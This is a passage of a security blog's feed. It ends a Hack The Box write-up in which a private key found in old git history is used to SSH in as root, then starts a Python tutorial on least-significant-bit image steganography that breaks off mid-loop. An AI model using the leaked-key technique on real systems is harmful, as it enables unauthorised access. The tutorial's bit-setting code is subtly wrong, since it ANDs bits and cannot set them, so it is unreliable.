changes and commit them, and you can discard any commits you make &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;now or later&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; by using &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; with the checkout &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;again. Example:

  git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &amp;lt;new-branch-name&amp;gt;

HEAD is now at d387abf... add key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;feed integration from tnerprise backend
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Better! The file &lt;strong&gt;authcredentials.key&lt;/strong&gt; has appeared inside resources/integration/.
Let’s try to login as root using this key:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'resources/integration/authcredentials.key'&lt;/span&gt; are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &lt;span class=&quot;s2&quot;&gt;&quot;resources/integration/authcredentials.key&quot;&lt;/span&gt;: bad permissions
root@localhost&lt;span class=&quot;s1&quot;&gt;'s password:
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;SSH refuses to use this key because permissions are too open. We can fix this with &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 0600 resources/integration/authcredentials.key&lt;/code&gt; and try to connect again.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
root@gitter:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bingo! Enjoy the flag :wink:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.</summary></entry><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#do-it-yourself&quot; id=&quot;markdown-toc-do-it-yourself&quot;&gt;Do It Yourself!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#technical-description&quot; id=&quot;markdown-toc-technical-description&quot;&gt;Technical description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#digital-image-structure&quot; id=&quot;markdown-toc-digital-image-structure&quot;&gt;Digital image structure&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#lsb-principle&quot; id=&quot;markdown-toc-lsb-principle&quot;&gt;LSB Principle&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#am-i-not-significant-to-you&quot; id=&quot;markdown-toc-am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#why-do-we-modify-this-very-specific-bit&quot; id=&quot;markdown-toc-why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-hide-a-message&quot; id=&quot;markdown-toc-how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#encoding-and-transforming-a-string-into-a-sequence-of-bits&quot; id=&quot;markdown-toc-encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#messing-with-pixels&quot; id=&quot;markdown-toc-messing-with-pixels&quot;&gt;Messing with pixels&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detection&quot; id=&quot;markdown-toc-detection&quot;&gt;Detection&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#all-about-contrast&quot; id=&quot;markdown-toc-all-about-contrast&quot;&gt;All about contrast&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#extraction&quot; id=&quot;markdown-toc-extraction&quot;&gt;Extraction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#python-my-love&quot; id=&quot;markdown-toc-python-my-love&quot;&gt;Python my love&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#your-turn&quot; id=&quot;markdown-toc-your-turn&quot;&gt;Your Turn!&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#resources&quot; id=&quot;markdown-toc-resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;do-it-yourself&quot;&gt;Do It Yourself!&lt;/h2&gt;

&lt;p&gt;If you’re already familiar with the concept of LSB and simply want to practice, download &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;this picture&lt;/a&gt; and feel free to send me your result or to post it in the comment section.&lt;/p&gt;

&lt;h2 id=&quot;technical-description&quot;&gt;Technical description&lt;/h2&gt;

&lt;h3 id=&quot;digital-image-structure&quot;&gt;Digital image structure&lt;/h3&gt;

&lt;p&gt;To understand this technique, a few reminders of some digital imaging basics might be useful.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A digital image is composed of \(X\) rows by \(Y\) columns.&lt;/li&gt;
  &lt;li&gt;The point of coordinates \([a,b]\) with \(0\leqslant a&amp;lt;X\) and \(0\leqslant b&amp;lt;Y\), is called a &lt;strong&gt;pixel&lt;/strong&gt;. The &lt;strong&gt;pixel&lt;/strong&gt; represents the smallest addressable element of a picture.&lt;/li&gt;
  &lt;li&gt;Each pixel is associated with a color, usually decomposed in three primary colors: &lt;strong&gt;Red, Green, Blue&lt;/strong&gt;. A pixel can then be specified as &lt;strong&gt;pixel(Red, Green, Blue)&lt;/strong&gt;, that’s what we call the &lt;em&gt;RGB model&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Red, Green and Blue intensities can vary from 0 to 255.&lt;/li&gt;
  &lt;li&gt;WHITE = (255,255,255) and BLACK = (0,0,0).&lt;/li&gt;
  &lt;li&gt;A pixel take 3 bytes of memory, 1 for each primary component (hence the maximum value of 255).&lt;/li&gt;
  &lt;li&gt;A byte consists of 8 bits, representing a binary number (example: 1010 0101).&lt;/li&gt;
  &lt;li&gt;The highest value a byte can take is 1111 1111, which is equal to 255 in decimal.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lsb-principle&quot;&gt;LSB Principle&lt;/h3&gt;

&lt;p&gt;Now that you have the structure of a digital image in mind, we can start talking about the serious stuff :wink:.&lt;/p&gt;

&lt;p&gt;As its name suggests, the Least Significant Bit technique is based on hiding information in the least significant bit of each byte of the picture. There are multiple variants of LSB but, in this article, we will set the focus on the most common one.&lt;/p&gt;

&lt;h4 id=&quot;am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/h4&gt;

&lt;p&gt;The notion of “Least Significant Bit” probably doesn’t speak to everyone so I’ll explain it.
Let’s take the following representation of a byte, where the weight is annotated below each bit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/byte_diagram.jpg&quot; alt=&quot;Bit weights&quot; title=&quot;Bit weights diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first bit on the left is the “heaviest” one since it’s the one that has the biggest influence on the value of the byte. Its weight is 128.&lt;/p&gt;

&lt;p&gt;Now look at the bit on the very right. Its weight is 1 and it has a very minor impact on the value of the byte.
In a way, this bit is the &lt;strong&gt;least significant bit&lt;/strong&gt; of this byte.&lt;/p&gt;

&lt;h4 id=&quot;why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/h4&gt;

&lt;p&gt;Well, simply because it’s the least significant one. Let me explain:&lt;/p&gt;

&lt;p&gt;The following diagram illustrates the color difference when the least significant bit of the red channel is modified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/significant_bit_diff.jpg&quot; alt=&quot;Significant bit modification&quot; title=&quot;Significant bit modification&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Can you spot the difference? No? Me neither and that’s exactly the goal! That way, we can modify &lt;strong&gt;3 bits per pixel&lt;/strong&gt; without it is noticeable.&lt;/p&gt;

&lt;h3 id=&quot;how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/h3&gt;

&lt;p&gt;Ok the theory should be clear now, but we’ve seen that we can only hide 3 bits per pixel and we want to dissimulate a full message! How are we supposed to do?&lt;/p&gt;

&lt;p&gt;Easy! A message is actually a sequence of bits so it’s not an issue. The only limitation is that the size of the message in bits must be inferior to the number of pixels in the picture multiplied by 3.&lt;/p&gt;

&lt;p&gt;There are plenty of tools already available for hiding a message inside a picture with the LSB technique but &lt;strong&gt;I encourage you to write your own tool&lt;/strong&gt;. This will help you getting familiar with a scripting language and will require from you a prefect understanding of the concept.&lt;/p&gt;

&lt;p&gt;For the needs, of this tutorial I used Python 2.7. Sources of the scripts used in this article will be downloadable at the bottom of the page.&lt;/p&gt;

&lt;p&gt;Alright, let’s dive into the code! :+1:&lt;/p&gt;

&lt;h4 id=&quot;encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/h4&gt;

&lt;p&gt;In order to avoid data losses caused by encoding problems, &lt;strong&gt;the initial message must be base64-encoded&lt;/strong&gt;.
There are many ways to turn a string into its binary representation in python, but I decided to use the &lt;a href=&quot;https://pypi.org/project/bitarray/&quot;&gt;bitarray module&lt;/a&gt;. If you don’t have it installed, just type &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo pip install bitarray&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bitarray&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'YourVerySecretText'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#Converts the message into an array of bits&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frombytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bit_array&lt;/strong&gt; now contains the binary representation of our message.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: Make sure to hide your message inside a PNG file and not a JPEG or its lossy compression algorithm will overwrite your modifications!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;messing-with-pixels&quot;&gt;Messing with pixels&lt;/h4&gt;

&lt;p&gt;Let’s say we want to hide our message inside this picture (download with &lt;strong&gt;Right click &amp;gt; Save Image as…&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot; alt=&quot;Confused Spongebob&quot; title=&quot;Confused Spongebob&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s a wonderful python library for manipulating images called &lt;a href=&quot;https://pillow.readthedocs.io/en/5.2.x/&quot;&gt;PIL&lt;/a&gt; (pillow since python3).&lt;/p&gt;

&lt;p&gt;First, let’s duplicate the original picture. We will only modify the one called “lsb_spongebob.png”.
Then, we store the image size for later.
The &lt;strong&gt;load()&lt;/strong&gt; function retrieves an array containing every pixel in RGB format.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s say we want to hide our message at the beginning of the &lt;strong&gt;first row of the picture&lt;/strong&gt;, I’ve written the following piece of code which is kinda ulgy, I agree, but that makes the job, you know :wink:.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Pixel : [&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Before : (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#Default values in case no bit has to be modified&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_green_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_bit_blue_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Red pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_bit_red_pixel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r_new_last_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#Green pixel&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;g_last_bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
